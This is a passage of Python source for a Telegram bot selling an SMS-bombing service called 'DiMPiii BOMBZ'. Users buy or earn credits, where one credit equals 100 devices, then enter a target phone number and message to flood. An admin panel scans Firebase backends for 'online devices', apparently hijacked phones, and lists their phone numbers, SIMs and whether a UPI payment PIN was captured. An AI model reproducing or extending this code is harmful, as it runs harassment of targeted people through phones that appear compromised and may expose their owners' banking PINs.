        keyboard = [
            [KeyboardButton(BTN_LAUNCH_BOMB, style='danger',  icon_custom_emoji_id=E_FIRE),
             KeyboardButton(BTN_BALANCE,     style='success', icon_custom_emoji_id=E_MONEY)],
            [KeyboardButton(BTN_STATUS,      style='primary', icon_custom_emoji_id=E_STATS),
             KeyboardButton(BTN_HISTORY,     style='primary', icon_custom_emoji_id=E_BOOKMARK)],
            [KeyboardButton(BTN_REDEEM_KEY,  style='success', icon_custom_emoji_id=E_CHECKBOX),
             KeyboardButton(BTN_REFERRAL,    style='primary', icon_custom_emoji_id=E_USERS)],
            [KeyboardButton(BTN_BUY_POINTS,  style='success', icon_custom_emoji_id=E_GIFT),
             KeyboardButton(BTN_ADMIN_PANEL, style='danger',  icon_custom_emoji_id=E_CROWN)],
            [KeyboardButton(BTN_ONLINE_DEV,  style='primary', icon_custom_emoji_id=E_BOLT),
             KeyboardButton(BTN_STATS_HIST,  style='primary', icon_custom_emoji_id=E_STATS)],
            [KeyboardButton(BTN_MANAGE_FB,   style='primary', icon_custom_emoji_id=E_GEAR),
             KeyboardButton(BTN_GEN_KEY,     style='success', icon_custom_emoji_id=E_CROWN)],
        ]
    else:
        keyboard = [
            [KeyboardButton(BTN_LAUNCH_BOMB, style='danger',  icon_custom_emoji_id=E_FIRE),
             KeyboardButton(BTN_BALANCE,     style='success', icon_custom_emoji_id=E_MONEY)],
            [KeyboardButton(BTN_STATUS,      style='primary', icon_custom_emoji_id=E_STATS),
             KeyboardButton(BTN_HISTORY,     style='primary', icon_custom_emoji_id=E_BOOKMARK)],
            [KeyboardButton(BTN_REDEEM_KEY,  style='success', icon_custom_emoji_id=E_CHECKBOX),
             KeyboardButton(BTN_REFERRAL,    style='primary', icon_custom_emoji_id=E_USERS)],
            [KeyboardButton(BTN_BUY_POINTS,  style='success', icon_custom_emoji_id=E_GIFT)],
        ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True, is_persistent=True)


USER_BUTTONS = [BTN_LAUNCH_BOMB, BTN_BALANCE, BTN_STATUS, BTN_HISTORY, BTN_REDEEM_KEY, BTN_REFERRAL, BTN_BUY_POINTS]
ADMIN_BUTTONS = [BTN_ONLINE_DEV, BTN_STATS_HIST, BTN_MANAGE_FB, BTN_GEN_KEY, BTN_ADMIN_PANEL]
ALL_BUTTONS = USER_BUTTONS + ADMIN_BUTTONS


# ---------- BASIC ----------
async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"🏓 <b>{scp('Pong!')}</b> {T_BOLT} <i>{scp('Bot is fast & online.')}</i>",
        parse_mode=ParseMode.HTML
    )


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    first_name = html_escape(update.effective_user.first_name or "User")

    if is_banned(user_id):
        u = get_user(user_id)
        reason = u.get("ban_reason") or "Violation of rules"
        await update.message.reply_text(
            f"{T_CROSS} <b>{scp('YOU ARE BANNED!')}</b>\n\n"
            f"{T_WARN} <b>{scp('Reason')}:</b> {html_escape(str(reason))}\n"
            f"{T_CROWN} {scp('Contact')}: {OWNER}",
            parse_mode=ParseMode.HTML
        )
        return

    args = context.args
    referred_by = None
    if args:
        try:
            raw = args[0].strip().replace("ref_", "").replace("REF", "").replace("ref", "")
            referrer_id = int(raw)
            if referrer_id != user_id:
                referred_by = referrer_id
                logger.info(f"Referral detected: {user_id} ← {referrer_id}")
        except Exception as e:
            logger.warning(f"Referral parse failed: {e}")

    if referred_by:
        context.user_data["pending_referrer"] = referred_by

    existing_user = get_user(user_id)
    if not existing_user:
        ensure_user(user_id, None)
        logger.info(f"New user registered: {user_id}")

    # ⭐ STEP 1: Channel check PEHLE
    joined, missing = await check_channel_membership(user_id, context.bot)
    if not joined:
        text = (
            "╭━━━━━━━━━━━━━━━━━━╮\n"
            f"   {T_CROWN} <b>{scp('ACCESS RESTRICTED')}</b> {T_CROWN}\n"
            "╰━━━━━━━━━━━━━━━━━━╯\n\n"
            f"{T_WARN} <b>{scp('Please join all channels to use this bot')}</b>\n\n"
            f"{T_CROWN} <b>{scp('Owner')}:</b> {OWNER}\n"
            f"{LINE}\n\n"
            f"{T_ARROW} {scp('Join the channels below, then tap')} <b>ɪ'ᴠᴇ ᴊᴏɪɴᴇᴅ</b>:"
        )
        await update.message.reply_text(text, reply_markup=get_join_keyboard(), parse_mode=ParseMode.HTML)
        return

    # ⭐ STEP 2: Channel joined → Ab referral process karo
    if referred_by:
        current_user = get_user(user_id)
        if current_user and not current_user.get("referred_by"):
            success = process_referral(referred_by, user_id)
            if success:
                logger.info(f"✅ Referral processed via start")
                try:
                    referrer_credits = get_user_credits(referred_by)
                    await context.bot.send_message(
                        chat_id=referred_by,
                        text=(
                            "╭━━━━━━━━━━━━━━━━━━╮\n"
                            f"   {T_GIFT} <b>{scp('NEW REFERRAL!')}</b> {T_GIFT}\n"
                            "╰━━━━━━━━━━━━━━━━━━╯\n\n"
                            f"{T_TICK} {scp('Someone joined using your link!')}\n\n"
                            f"{T_HEART_P} <b>{scp('You earned')}:</b> {REFERRAL_REWARD} {scp('Credit')}\n"
                            f"{T_MONEY} <b>{scp('Total Credits')}:</b> {referrer_credits}\n\n"
                            f"{T_SPARKLES} {scp('Keep sharing to earn more!')}"
                        ),
                        parse_mode=ParseMode.HTML
                    )
                except Exception as e:
                    logger.warning(f"Notification failed: {e}")
        context.user_data.pop("pending_referrer", None)

    credits = get_user_credits(user_id)
    points = get_user_points(user_id)
    ref_count = get_referral_count(user_id)
    is_admin = user_id in ADMIN_IDS
    role = f"{T_CROWN} <b>{scp('ADMIN')}</b>" if is_admin else f"{T_STAR} <b>{scp('USER')}</b>"

    text = (
        "╭━━━━━━━━━━━━━━━━━━╮\n"
        f"   {T_FIRE} <b>{scp('DiMPiii BOMBZ')}</b> {T_FIRE}\n"
        "╰━━━━━━━━━━━━━━━━━━╯\n\n"
        f"{T_SPARKLES} <b>{scp('Welcome')}, {first_name}!</b>\n\n"
        f"{T_STAR} <b>{scp('User ID')}:</b> <code>{user_id}</code>\n"
        f"{T_HEART_P} <b>{scp('Credits')}:</b> {credits}\n"
        f"{T_GEM} <b>{scp('Points')}:</b> {points}\n"
        f"{T_USERS} <b>{scp('Referrals')}:</b> {ref_count}\n"
        f"{T_CROWN} <b>{scp('Role')}:</b> {role}\n"
        f"{T_GEAR} <b>{scp('Owner')}:</b> {OWNER}\n\n"
        f"{LINE}\n"
        f"{T_FIRE} <b>1 {scp('Credit')} = 100 {scp('Devices')}</b>\n"
        f"{T_GIFT} <b>{scp('Per Referral')} = {REFERRAL_REWARD} {scp('Credit')}</b>\n"
        f"{LINE}\n\n"
        f"{T_MEGA} {scp('Use the keyboard below to navigate')} ✨"
    )
    await update.message.reply_text(text, reply_markup=get_main_keyboard(user_id), parse_mode=ParseMode.HTML)


# ==================================================================
# 🛡️ ADMIN PANEL
# ==================================================================
def build_admin_panel_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(scp("Add Firebase"), callback_data="admin_addfb", icon_custom_emoji_id=E_LINK),
         InlineKeyboardButton(scp("Manage FB"),   callback_data="admin_managefb", icon_custom_emoji_id=E_GEAR)],
        [InlineKeyboardButton(scp("Gen Key"),     callback_data="admin_genkey",  icon_custom_emoji_id=E_CHECKBOX),
         InlineKeyboardButton(scp("Online Devices"), callback_data="admin_devices", icon_custom_emoji_id=E_BOLT)],
        [InlineKeyboardButton(scp("Broadcast"),   callback_data="admin_broadcast", icon_custom_emoji_id=E_MEGA),
         InlineKeyboardButton(scp("Pending Buys"), callback_data="admin_pending",  icon_custom_emoji_id=E_MONEY)],
        [InlineKeyboardButton(scp("All Jobs"),    callback_data="admin_alljobs",  icon_custom_emoji_id=E_STATS),
         InlineKeyboardButton(scp("Statistics"),  callback_data="admin_stats",    icon_custom_emoji_id=E_STATS)],
        [InlineKeyboardButton(scp("Add Credits"), callback_data="admin_addcredits", icon_custom_emoji_id=E_GEM),
         InlineKeyboardButton(scp("Remove Credits"), callback_data="admin_remcredits", icon_custom_emoji_id=E_CROSS)],
        [InlineKeyboardButton(scp("Set Credits"), callback_data="admin_setcredits", icon_custom_emoji_id=E_MONEY),
         InlineKeyboardButton(scp("Add Points"),  callback_data="admin_addpoints",  icon_custom_emoji_id=E_STAR)],
        [InlineKeyboardButton(scp("Remove Points"), callback_data="admin_rempoints", icon_custom_emoji_id=E_CROSS),
         InlineKeyboardButton(scp("Set Points"),    callback_data="admin_setpoints", icon_custom_emoji_id=E_STAR)],
        [InlineKeyboardButton(scp("Ban User"),    callback_data="admin_ban",    icon_custom_emoji_id=E_LOCK),
         InlineKeyboardButton(scp("Unban User"),  callback_data="admin_unban",  icon_custom_emoji_id=E_OK)],
        [InlineKeyboardButton(scp("Banned List"), callback_data="admin_banlist", icon_custom_emoji_id=E_FILE),
         InlineKeyboardButton(scp("Refresh"),     callback_data="admin_refresh", icon_custom_emoji_id=E_REFRESH)],
    ])


def build_admin_panel_text(user_id):
    conn = _connect(); c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM users"); total_users = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM jobs"); total_jobs = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM keys"); total_keys = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM purchases WHERE status='pending'"); pending_purchases = c.fetchone()[0]
    c.execute("SELECT COALESCE(SUM(credits), 0) FROM users"); total_credits = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM users WHERE is_banned=1"); total_banned = c.fetchone()[0]
    conn.close()
    firebases = load_firebase_urls()

    return (
        "╭━━━━━━━━━━━━━━━━━━╮\n"
        f"   {T_CROWN} <b>{scp('ADMIN PANEL')}</b> {T_CROWN}\n"
        "╰━━━━━━━━━━━━━━━━━━╯\n\n"
        f"{T_USERS} <b>{scp('Total Users')}:</b> {total_users}\n"
        f"{T_FILE} <b>{scp('Total Jobs')}:</b> {total_jobs}\n"
        f"{T_LINK} <b>{scp('Firebases')}:</b> {len(firebases)}\n"
        f"{T_CHECKBOX} <b>{scp('Total Keys')}:</b> {total_keys}\n"
        f"{T_GEM} <b>{scp('Total Credits')}:</b> {round(float(total_credits), 2)}\n"
        f"{T_MONEY} <b>{scp('Pending Buys')}:</b> {pending_purchases}\n"
        f"{T_LOCK} <b>{scp('Banned Users')}:</b> {total_banned}\n\n"
        f"{LINE}\n"
        f"{T_CROWN} <b>{scp('Owner')}:</b> {OWNER}\n"
        f"{T_GEAR} <b>{scp('Admin ID')}:</b> <code>{user_id}</code>\n\n"
        f"{T_SPARKLES} {scp('Select an option below')}:"
    )


async def admin_panel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text(f"{T_CROSS} <b>{scp('Unauthorized Access!')}</b>", parse_mode=ParseMode.HTML)
        return
    await update.message.reply_text(
        build_admin_panel_text(user_id),
        reply_markup=build_admin_panel_kb(),
        parse_mode=ParseMode.HTML
    )


# ---------- CALLBACK HANDLER ----------
async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = update.effective_user.id

    if data == "check_join":
        joined, missing = await check_channel_membership(user_id, BOT)
        if joined:
            pending_referrer = context.user_data.get("pending_referrer")
            if pending_referrer:
                current_user = get_user(user_id)
                if current_user and not current_user.get("referred_by"):
                    success = process_referral(pending_referrer, user_id)
                    if success:
                        try:
                            referrer_credits = get_user_credits(pending_referrer)
                            await context.bot.send_message(
                                chat_id=pending_referrer,
                                text=(
                                    "╭━━━━━━━━━━━━━━━━━━╮\n"
                                    f"   {T_GIFT} <b>{scp('NEW REFERRAL!')}</b> {T_GIFT}\n"
                                    "╰━━━━━━━━━━━━━━━━━━╯\n\n"
                                    f"{T_TICK} {scp('Someone joined using your link!')}\n\n"
                                    f"{T_HEART_P} <b>{scp('You earned')}:</b> {REFERRAL_REWARD} {scp('Credit')}\n"
                                    f"{T_MONEY} <b>{scp('Total Credits')}:</b> {referrer_credits}\n\n"
                                    f"{T_SPARKLES} {scp('Keep sharing to earn more!')}"
                                ),
                                parse_mode=ParseMode.HTML
                            )
                        except Exception as e:
                            logger.warning(f"Notification failed: {e}")
                context.user_data.pop("pending_referrer", None)

            await query.edit_message_text(
                f"{T_TICK} <b>{scp('All channels joined!')}</b>\n{T_SPARKLES} {scp('Welcome to DiMPiii BOMBZ.')}",
                parse_mode=ParseMode.HTML
            )
            credits = get_user_credits(user_id)
            points = get_user_points(user_id)
            ref_count = get_referral_count(user_id)
            is_admin = user_id in ADMIN_IDS
            role = f"{T_CROWN} <b>{scp('ADMIN')}</b>" if is_admin else f"{T_STAR} <b>{scp('USER')}</b>"
            text = (
                "╭━━━━━━━━━━━━━━━━━━╮\n"
                f"   {T_FIRE} <b>{scp('DiMPiii BOMBZ')}</b> {T_FIRE}\n"
                "╰━━━━━━━━━━━━━━━━━━╯\n\n"
                f"{T_STAR} <b>{scp('User ID')}:</b> <code>{user_id}</code>\n"
                f"{T_HEART_P} <b>{scp('Credits')}:</b> {credits}\n"
                f"{T_GEM} <b>{scp('Points')}:</b> {points}\n"
                f"{T_USERS} <b>{scp('Referrals')}:</b> {ref_count}\n"
                f"{T_CROWN} <b>{scp('Role')}:</b> {role}\n"
                f"{T_GEAR} <b>{scp('Owner')}:</b> {OWNER}\n\n"
                f"{LINE}\n"
                f"{T_FIRE} <b>1 {scp('Credit')} = 100 {scp('Devices')}</b>\n"
                f"{LINE}\n\n"
                f"{T_MEGA} {scp('Use the keyboard below to navigate')} ✨"
            )
            await query.message.reply_text(text, reply_markup=get_main_keyboard(user_id), parse_mode=ParseMode.HTML)
        else:
            ch_list = "\n".join([f"• {html_escape(ch)}" for ch in missing])
            await query.edit_message_text(
                f"{T_CROSS} <b>{scp('Not joined all channels yet!')}</b>\n\n"
                f"{T_WARN} {scp('Missing')}:\n{ch_list}\n\n"
                f"{scp('Please join and click again.')}",
                reply_markup=get_join_keyboard(),
                parse_mode=ParseMode.HTML
            )
        return

    if data.startswith("buy_"):
        package_id = data.replace("buy_", "")
        if package_id in POINT_PACKAGES:
            pkg = POINT_PACKAGES[package_id]
            conn = _connect(); c = conn.cursor()
            c.execute("INSERT INTO purchases (user_id, package_id, points, price) VALUES (?,?,?,?)",
                      (user_id, package_id, pkg["points"], pkg["price"]))
            conn.commit(); conn.close()
            await query.edit_message_text(
                f"╭━━━━━━━━━━━━━━━━━━╮\n"
                f"   {T_GIFT} <b>{scp('PURCHASE REQUEST')}</b> {T_GIFT}\n"
                f"╰━━━━━━━━━━━━━━━━━━╯\n\n"
                f"{T_STAR} <b>{scp('Package')}:</b> {pkg['label']}\n"
                f"{T_MONEY} <b>{scp('Price')}:</b> ₹{pkg['price']}\n"
                f"{T_GEM} <b>{scp('Points')}:</b> {'ᴜɴʟɪᴍɪᴛᴇᴅ' if pkg['points'] == -1 else pkg['points']}\n\n"
                f"{LINE}\n"
                f"{T_MSG} <b>{scp('Contact to purchase')}:</b>\n"
                f"{T_CROWN} {OWNER}\n"
                f"{LINE}\n\n"
                f"{T_WARN} <i>{scp('Send screenshot after payment.')}</i>",
                parse_mode=ParseMode.HTML
            )
        return

    if data.startswith("confirm_"):
        if user_id not in ADMIN_IDS:
            await query.answer("Unauthorized", show_alert=True)
            return
        purchase_id = int(data.replace("confirm_", ""))
        conn = _connect(); c = conn.cursor()
        c.execute("SELECT user_id, package_id, points, price FROM purchases WHERE id=? AND status='pending'", (purchase_id,))
        row = c.fetchone()
        if not row:
            conn.close()
            await query.edit_message_text(f"{T_CROSS} {scp('Purchase not found or already processed.')}")
            return
        target_user, package_id, points, price = row
        c.execute("UPDATE purchases SET status='completed' WHERE id=?", (purchase_id,))
        conn.commit(); conn.close()

        if package_id == "unlimited":
            expiry = (datetime.now() + timedelta(days=30)).isoformat()
            conn = _connect(); c = conn.cursor()
            c.execute("UPDATE users SET is_unlimited=1, unlimited_expiry=? WHERE user_id=?", (expiry, target_user))
            conn.commit(); conn.close()
            msg = f"{T_CROWN} <b>{scp('Unlimited Plan Activated!')}</b>\n{T_SPARKLES} {scp('Valid for 30 days.')}"
        else:
            add_points(target_user, points)
            msg = f"{T_GEM} <b>{points} {scp('Points Added!')}</b>"

        try:
            await context.bot.send_message(target_user,
                f"{T_TICK} <b>{scp('Purchase Confirmed!')}</b>\n\n{msg}",
                parse_mode=ParseMode.HTML)
        except:
            pass
        await query.edit_message_text(f"{T_TICK} {scp('Purchase confirmed for user')} {target_user}.")
        return

    if data.startswith("admin_"):
        if user_id not in ADMIN_IDS:
            await query.answer("Unauthorized", show_alert=True)
            return

        if data in ("admin_refresh", "admin_back"):
            try:
                await query.edit_message_text(
                    build_admin_panel_text(user_id),
                    reply_markup=build_admin_panel_kb(),
                    parse_mode=ParseMode.HTML
                )
            except Exception:
                pass
            return

        back_kb = InlineKeyboardMarkup([[
            InlineKeyboardButton(scp("Back"), callback_data="admin_back", icon_custom_emoji_id=E_ARROW)
        ]])

        if data == "admin_addfb":
            await query.edit_message_text(
                f"{T_LINK} <b>{scp('ADD FIREBASE')}</b>\n\n"
                f"{T_MSG} {scp('Use command')}:\n"
                f"<code>/addfb &lt;firebase_url&gt;</code>",
                parse_mode=ParseMode.HTML, reply_markup=back_kb
            )
            return

        if data == "admin_managefb":
            firebases = load_firebase_urls()
            if not firebases:
                text = f"{T_WARN} {scp('No Firebase saved.')}\n\n{T_MSG} {scp('Use')} <code>/addfb &lt;url&gt;</code>"
            else:
                text = f"{T_GEAR} <b>{scp('SAVED FIREBASES')}</b>\n{LINE}\n\n"
                for fb in firebases:
                    text += f"{T_STAR} <b>{html_escape(fb['id'])}</b>\n{T_LINK} <code>{html_escape(fb['url'])}</code>\n{LINE_THIN}\n"
                text += f"\n{T_MSG} {scp('Delete')}: <code>/deletefb &lt;id&gt;</code>"
            await query.edit_message_text(text[:4000], parse_mode=ParseMode.HTML, reply_markup=back_kb)
            return

        if data == "admin_genkey":
            await query.edit_message_text(
                f"{T_CHECKBOX} <b>{scp('GENERATE KEY')}</b>\n\n"
                f"{T_MSG} {scp('Use command')}:\n"
                f"<code>/addkey &lt;credits&gt; &lt;max_uses&gt;</code>",
                parse_mode=ParseMode.HTML, reply_markup=back_kb
            )
            return

        if data == "admin_devices":
            firebases = load_firebase_urls()
            msg = await query.edit_message_text(
                "╭━━━━━━━━━━━━━━━━━━╮\n"
                f"   {T_BOLT} <b>{scp('SCANNING DEVICES')}</b> {T_BOLT}\n"
                "╰━━━━━━━━━━━━━━━━━━╯\n\n"
                f"{T_REFRESH} <b>{scp('FIREBASE')}:</b> 0/{len(firebases)} {scp('checked')}\n"
                f"{T_BOLT} <b>{scp('DEVICE')}:</b> 0 {scp('found')}\n\n"
                f"{T_MSG} {scp('Please wait...')}",
                parse_mode=ParseMode.HTML
            )
            all_devices = []
            checked = 0
            for fb in firebases:
                devices = await get_online_devices(fb["url"])
                checked += 1
                for d in devices:
                    d["fb_id"] = fb["id"]
                    url = fb["url"]
                    fb_name = url.replace("https://", "").replace("http://", "").split(".")[0]
                    d["fb_name"] = fb_name
                    all_devices.append(d)
                try:
                    await msg.edit_text(
                        "╭━━━━━━━━━━━━━━━━━━╮\n"
                        f"   {T_BOLT} <b>{scp('SCANNING DEVICES')}</b> {T_BOLT}\n"
                        "╰━━━━━━━━━━━━━━━━━━╯\n\n"
                        f"{T_REFRESH} <b>{scp('FIREBASE')}:</b> {checked}/{len(firebases)} {scp('checked')}\n"
                        f"{T_BOLT} <b>{scp('DEVICE')}:</b> {len(all_devices)} {scp('found')}\n\n"
                        f"{T_MSG} {scp('Please wait...')}",
                        parse_mode=ParseMode.HTML
                    )
                except:
                    pass

            if not all_devices:
                await msg.edit_text(f"{T_WARN} <b>{scp('No online devices.')}</b>",
                                    parse_mode=ParseMode.HTML, reply_markup=back_kb)
                return

            text = (
                "╭━━━━━━━━━━━━━━━━━━╮\n"
                f"   {T_BOLT} <b>{scp('ONLINE DEVICES')}</b> {T_BOLT}\n"
                "╰━━━━━━━━━━━━━━━━━━╯\n\n"
                f"{T_STATS} <b>{scp('Total Devices')}:</b> {len(all_devices)}\n"
                f"{T_LINK} <b>{scp('Firebases')}:</b> {checked}\n"
                f"{LINE}\n\n"
            )
            for d in all_devices:
                try:
                    bv = int(str(d['battery']).replace('%', '')) if d['battery'] != 'N/A' else 0
                except:
                    bv = 0
                bi = "🔋" if bv > 30 else "🪫"
                text += (
                    f"{T_STAR} <b>{scp('FIREBASE')} :</b> <code>{html_escape(str(d['fb_name']))}</code>\n"
                    f"{T_PIN} <b>{scp('Device')}:</b> {html_escape(str(d['name']))}\n"
                    f"{T_BOOKMARK} <b>ID:</b> <code>{html_escape(str(d['id']))}</code>\n"
                    f"{T_MSG} <b>{scp('Number')}:</b> {html_escape(str(d['phone']))}\n"
                    f"{bi} <b>{scp('Battery')}:</b> {html_escape(str(d['battery']))} | {len(d['sims'])} SIM(s)\n"
                    f"{T_SHIELD} <b>UPI PIN:</b> {'✅' if d.get('upipin') else '❌'}\n"
                    f"{LINE_THIN}\n"
                )
            if len(text) > 4000:
                text = text[:3990] + "..."
            await msg.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=back_kb)
            return

        if data == "admin_broadcast":
            await query.edit_message_text(
                f"{T_MEGA} <b>{scp('BROADCAST')}</b>\n\n"
                f"{T_MSG} {scp('Use command')}:\n"
                f"<code>/broadcast &lt;message&gt;</code>",
                parse_mode=ParseMode.HTML, reply_markup=back_kb
            )
            return

        if data == "admin_pending":
            conn = _connect(); c = conn.cursor()
            c.execute("SELECT id, user_id, package_id, points, price FROM purchases WHERE status='pending' ORDER BY created_at DESC LIMIT 20")
            rows = c.fetchall(); conn.close()
            if not rows:
                text = f"{T_TICK} {scp('No pending purchases.')}"
                kb = [InlineKeyboardButton(scp("Back"), callback_data="admin_back", icon_custom_emoji_id=E_ARROW)]
                await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup([kb]))
            else:
                text = f"{T_MONEY} <b>{scp('PENDING PURCHASES')}</b>\n{LINE}\n\n"
                kb = []
                for r in rows:
                    text += (f"{T_STAR} <b>ID:</b> <code>{r[0]}</code>\n"
                             f"{T_USERS} User: <code>{r[1]}</code>\n"
                             f"{T_GEM} {r[2]} - ₹{r[4]}\n{LINE_THIN}\n")
                    kb.append([InlineKeyboardButton(f"✅ Confirm #{r[0]}",
                                                    callback_data=f"confirm_{r[0]}",
                                                    icon_custom_emoji_id=E_OK)])
                kb.append([InlineKeyboardButton(scp("Back"), callback_data="admin_back", icon_custom_emoji_id=E_ARROW)])
                await query.edit_message_text(text[:4000], parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(kb))
            return

        if data == "admin_alljobs":
            jobs = db_get_jobs(limit=15)
            text = f"{T_FILE} <b>{scp('ALL JOBS')}</b>\n{LINE}\n\n"
            for j in jobs:
                se = {"pending": "⏳", "running": "🔄", "completed": "✅", "failed": "❌",
                      "cancelled": "🚫"}.get(j["status"], "❓")
                text += f"{se} <b>{html_escape(str(j['target']))}</b> ({j['status']})\n"
            await query.edit_message_text(text[:4000], parse_mode=ParseMode.HTML, reply_markup=back_kb)
            return

        if data == "admin_stats":
            jobs = db_get_jobs(limit=200)
            total_jobs = len(jobs)
            completed = sum(1 for j in jobs if j["status"] == "completed")
            total_sent = sum(j.get("success_count", 0) or 0 for j in jobs)
            total_fail = sum(j.get("fail_count", 0) or 0 for j in jobs)
            rate = round(total_sent / (total_sent + total_fail) * 100) if (total_sent + total_fail) > 0 else 0
            text = (
                "╭━━━━━━━━━━━━━━━━━━╮\n"
                f"   {T_STATS} <b>{scp('STATISTICS')}</b> {T_STATS}\n"
                "╰━━━━━━━━━━━━━━━━━━╯\n\n"
                f"{T_FILE} {scp('Total Jobs')}: {total_jobs}\n"
                f"{T_TICK} {scp('Completed')}: {completed}\n"
                f"{T_MSG} {scp('Total SMS')}: {total_sent}\n"
                f"{T_CROSS} {scp('Failed')}: {total_fail}\n"
                f"{T_SPARKLES} {scp('Success Rate')}: {rate}%"
            )
            await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=back_kb)
            return

        info_pages = {
            "admin_addcredits": (f"{T_GEM} <b>{scp('ADD CREDITS')}</b>",
                                  "<code>/addcredits &lt;user_id&gt; &lt;amount&gt;</code>"),
            "admin_remcredits": (f"{T_CROSS} <b>{scp('REMOVE CREDITS')}</b>",
                                  "<code>/remcredits &lt;user_id&gt; &lt;amount&gt;</code>"),
            "admin_setcredits": (f"{T_MONEY} <b>{scp('SET CREDITS')}</b>",
                                  "<code>/setcredits &lt;user_id&gt; &lt;amount&gt;</code>"),
            "admin_addpoints":  (f"{T_STAR} <b>{scp('ADD POINTS')}</b>",
                                  "<code>/addpoints &lt;user_id&gt; &lt;amount&gt;</code>"),
            "admin_rempoints":  (f"{T_CROSS} <b>{scp('REMOVE POINTS')}</b>",
                                  "<code>/rempoints &lt;user_id&gt; &lt;amount&gt;</code>"),
            "admin_setpoints":  (f"{T_STAR} <b>{scp('SET POINTS')}</b>",
                                  "<code>/setpoints &lt;user_id&gt; &lt;amount&gt;</code>"),
            "admin_ban":        (f"{T_LOCK} <b>{scp('BAN USER')}</b>",
                                  "<code>/ban &lt;user_id&gt; [reason]</code>"),
            "admin_unban":      (f"{T_OK} <b>{scp('UNBAN USER')}</b>",
                                  "<code>/unban &lt;user_id&gt;</code>"),
        }
        if data in info_pages:
            title, cmd = info_pages[data]
            await query.edit_message_text(
                f"{title}\n\n{T_MSG} {scp('Use command')}:\n{cmd}",
                parse_mode=ParseMode.HTML, reply_markup=back_kb
            )
            return

        if data == "admin_banlist":
            banned = get_banned_users()
            if not banned:
                text = f"{T_TICK} {scp('No banned users.')}"
            else:
                text = f"{T_LOCK} <b>{scp('BANNED USERS')}</b>\n{LINE}\n\n"
                for b in banned:
                    text += f"{T_USERS} <code>{b['user_id']}</code>\n{T_WARN} {html_escape(str(b.get('ban_reason') or 'No reason'))}\n{LINE_THIN}\n"
            await query.edit_message_text(text[:4000], parse_mode=ParseMode.HTML, reply_markup=back_kb)
            return


# ==================================================================
# BOMB WIZARD — Number → Message → Credits → Scan → Bomb
# ==================================================================
async def bomb_wizard_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_credits = get_user_credits(user_id)

    if user_credits <= 0:
        await update.message.reply_text(
            f"{T_WARN} <b>{scp('You have 0 credits!')}</b>\n\n"
            f"{T_FIRE} <b>1 {scp('Credit')} = 100 {scp('Devices')}</b>\n"
            f"{T_GIFT} {scp('Buy credits from')} {OWNER}\n"
            f"{T_USERS} {scp('Or get free via referrals')}",
            reply_markup=get_main_keyboard(user_id),
            parse_mode=ParseMode.HTML
        )
        return ConversationHandler.END

    text = (
        "╭━━━━━━━━━━━━━━━━━━╮\n"
        f"   {T_FIRE} <b>{scp('LAUNCH BOMB')}</b> {T_FIRE}\n"
        "╰━━━━━━━━━━━━━━━━━━╯\n\n"
        f"{T_HEART_P} <b>{scp('Your Credits')}:</b> {user_credits}\n"
        f"{T_FIRE} <b>1 {scp('Credit')} = 100 {scp('Devices')}</b>\n"
        f"{LINE}\n\n"
        f"{T_MSG} {scp('Please enter the target phone number')}\n"
        f"{T_PIN} {scp('Format')}: <code>919876543210</code>\n\n"
        f"{T_CROSS} {scp('Tap CANCEL below to abort.')}"
    )
    await update.message.reply_text(text, reply_markup=get_cancel_keyboard(), parse_mode=ParseMode.HTML)
    return TARGET


async def bomb_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    user_id = update.effective_user.id

    if text == BTN_CANCEL or text in ALL_BUTTONS:
        context.user_data.clear()
        await update.message.reply_text(
            f"{T_CROSS} {scp('Operation cancelled.')}",
            reply_markup=get_main_keyboard(user_id), parse_mode=ParseMode.HTML
        )
        return ConversationHandler.END

    if not text.isdigit():
        await update.message.reply_text(
            f"{T_CROSS} {scp('Please enter a valid numeric phone number.')}",
            parse_mode=ParseMode.HTML
        )
        return TARGET
    context.user_data["target"] = text
    await update.message.reply_text(
        f"{T_TICK} <b>{scp('Number saved')}:</b> <code>{text}</code>\n\n"
        f"{T_MSG} {scp('Now enter the message you want to send')}:",
        reply_markup=get_cancel_keyboard(), parse_mode=ParseMode.HTML
    )
    return MESSAGE


async def bomb_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    user_id = update.effective_user.id

    if text == BTN_CANCEL or text in ALL_BUTTONS:
        context.user_data.clear()
        await update.message.reply_text(
            f"{T_CROSS} {scp('Operation cancelled.')}",
            reply_markup=get_main_keyboard(user_id), parse_mode=ParseMode.HTML
        )
        return ConversationHandler.END

    context.user_data["message"] = text
    target = context.user_data.get("target", "N/A")
    user_credits = get_user_credits(user_id)

    text_msg = (
        "╭━━━━━━━━━━━━━━━━━━╮\n"
        f"   {T_GEM} <b>{scp('SELECT CREDITS')}</b> {T_GEM}\n"
        "╰━━━━━━━━━━━━━━━━━━╯\n\n"
        f"{T_PIN} <b>{scp('NUMBER')}:</b> <code>{html_escape(str(target))}</code>\n"
        f"{T_MSG} <b>{scp('MESSAGE')}:</b> {html_escape(str(text))}\n"
        f"{LINE}\n\n"
        f"{T_HEART_P} <b>{scp('Your Credits')}:</b> {user_credits}\n"
        f"{T_FIRE} <b>1 {scp('Credit')} = 100 {scp('Devices')}</b>\n\n"
        f"{T_ARROW} <b>{scp('How many credits do you want to use?')}</b>\n"
        f"{T_PIN} {scp('Example')}: <code>1</code> → 100 devices | <code>2</code> → 200 devices\n\n"
        f"{T_CROSS} {scp('Tap CANCEL below to abort.')}"
    )
